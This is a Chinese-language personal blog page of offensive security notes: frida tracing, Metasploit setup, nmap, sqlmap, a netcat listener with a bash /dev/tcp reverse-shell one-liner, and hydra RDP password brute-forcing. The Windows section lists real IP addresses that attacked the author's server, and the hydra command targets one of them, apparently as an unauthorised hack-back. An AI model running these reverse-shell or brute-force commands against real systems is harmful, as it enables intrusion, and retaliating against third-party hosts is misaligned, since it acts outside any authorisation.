---
title: "安全"
date: 2021-05-01T13:22:38+08:00
lastmod: 2021-05-01T13:22:38+08:00
draft: false
keywords: []
description: ""
tags: ["security", "reverse"]
categories: []
author: "lttzz"

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: true
autoCollapseToc: true
postMetaInFooter: false
hiddenFromHomePage: false
# You can also define another contentCopyright. e.g. contentCopyright: "This is another copyright."
contentCopyright: false
reward: false
mathjax: false
mathjaxEnableSingleDollar: false
mathjaxEnableAutoNumber: false

# You unlisted posts you might want not want the header or footer to show
hideHeaderAndFooter: false

# You can enable or disable out-of-date content warning for individual post.
# Comment this out to use the global config.
#enableOutdatedInfoWarning: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

<!--more-->

# 0x00 Tools

## frida

``` bash
# frida https://github.com/frida/frida
$ pip install frida
$ pip install frida-tools

# server https://github.com/frida/frida/releases
# cat /proc/cpuinfo
# genymotion 选 x86

# 执行ps有返回结果，则说明搭建成功
$ frida-ps -U

# 版本一定要注意一致，否则可能出现奇奇怪怪的问题
# frida  frida-tools  frida-server

## frida-ps
# Connect Frida to an iPad over USB and list running processes
$ frida-ps -U
# List running applications
$ frida-ps -Ua
# List installed applications
$ frida-ps -Uai


## frida-trace
$ frida-trace -U -i open Chrome 
# Trace recv* and send* APIs in Safari, insert library names
# in logging
$ frida-trace --decorate -i "recv*" -i "send*" Safari
# Trace ObjC method calls in Safari
$ frida-trace -m "-[NSView drawRect:]" Safari
# Launch SnapChat on your iPhone and trace crypto API calls
$ frida-trace \
    -U \
    -f com.toyopagroup.picaboo \
    -I "libcommonCrypto*"
# Launch YouTube on your Android device and trace Java methods
# with “certificate” in their signature (s), ignoring case (i)
# and only searching in user-defined classes (u)
$ frida-trace \
    -U \
    -f com.google.android.youtube \
    --runtime=v8 \
    -j '*!*certificate*/isu'
# Trace all JNI functions in Samsung FaceService app on Android
$ frida-trace -U -i "Java_*" com.samsung.faceservice
# Trace a Windows process's calls to "mem*" functions in msvcrt.dll
$ frida-trace -p 1372 -i "msvcrt.dll!*mem*"
# Trace all functions matching "*open*" in the process except
# in msvcrt.dll
$ frida-trace -p 1372 -i "*open*" -x "msvcrt.dll!*open*"
# Trace an unexported function in libjpeg.so
$ frida-trace -p 1372 -a "libjpeg.so!0x4793c"
	-i FUNCTION, --include=FUNCTION include [MODULE]![FUNCTION]
  -x FUNCTION, --exclude=FUNCTION exclude [MODULE]![FUNCTION]
  -j JAVA_METHOD, --include-java-method=JAVA_METHOD include JAVA_METHOD
  -J JAVA_METHOD, --exclude-java-method=JAVA_METHOD exclude JAVA_METHOD
  -d, --decorate        add module name to generated onEnter log statement
  -F, --attach-frontmost attach to frontmost application
  -n NAME, --attach-name=NAME attach to NAME
  -p PID, --attach-pid=PID attach to PID
```

### reference

[『Android安全』版优秀和精华帖分类索引](https://bbs.pediy.com/thread-179524.htm)

## Metasploit

``` bash
# 先安装 postgresql 喽
$ dnf install  postgresql-server postgresql-contrib
$ systemctl enable postgresql
$ systemctl start postgresql		# 启动不了就重启吧，233
$ postgresql-setup --initdb --unit postgresql
$ su - postgres
$ psql
	alter user postgres with password 'password_for_postgres';
	create user msf with password 'password_for_msf' createdb;
	create database msf with owner=msf;

```





# 0x01 Linux

## 反弹shell

``` bash
# 攻击端监听端口
$ nc -lvp 2333

# 被攻击端反弹shell
$ bash -i >& /dev/tcp/{ip}/{port} 0>&1
```





# 0x02 Windows

## 随便写点什么

![](/Picbed/2021_10/1020_00.png)

![](/Picbed/2021_10/1020_01.png)

女朋友笔记本是mba，然后有一天要用Windows，就把一台没啥用的服务器装好了Windows Server 2019 Datacenter给她用了。公网ip不能浪费啊，平常会挂点热门种子，刷刷上传。然后有一天登不上去，没想太多，到控制台改了密码就没管。

今天想起来了，看了下日志，1s一次的登陆请求？NtLmSsp登陆爆破可真行，攻击IP如下：

```
39.174.37.173
47.103.26.179
47.103.62.23
```

很快啊，他也没了。

![](/Picbed/2021_10/1020_02.png)

不太对劲的样子，不会是honeypot吧。

# 0x03 Android

``` bash
ps -e | grep {keyword}
```







# 0x04 Web

## Information Gather

### nmap

``` bash
# 完整扫描，列出详细信息
$ nmap –T4 –A –v target_ip
# 主机发现
$ nmap -T4 -sn target_ip
# 端口扫描
$ nmap -T4 target_ip
# 服务扫描
$ nmap -T4 -sV target_ip
# OS探测
$ nmap -T4 -O target_ip
```

## hydra

``` bash
# 3389
$ hydra 47.103.26.179 rdp -l administrator -P passwd.txt -V		# 爆破 administrator
$ hydra 47.103.26.179 rdp -L user.txt -P passwd.txt -V
```

## sql注入

``` bash
# 获取网站信息
sqlmap.py -u http://www.xxx.com/ss?id=xxx

sqlmap.py -u http://www.xxx.com/ss?id=xxx --dbs
```

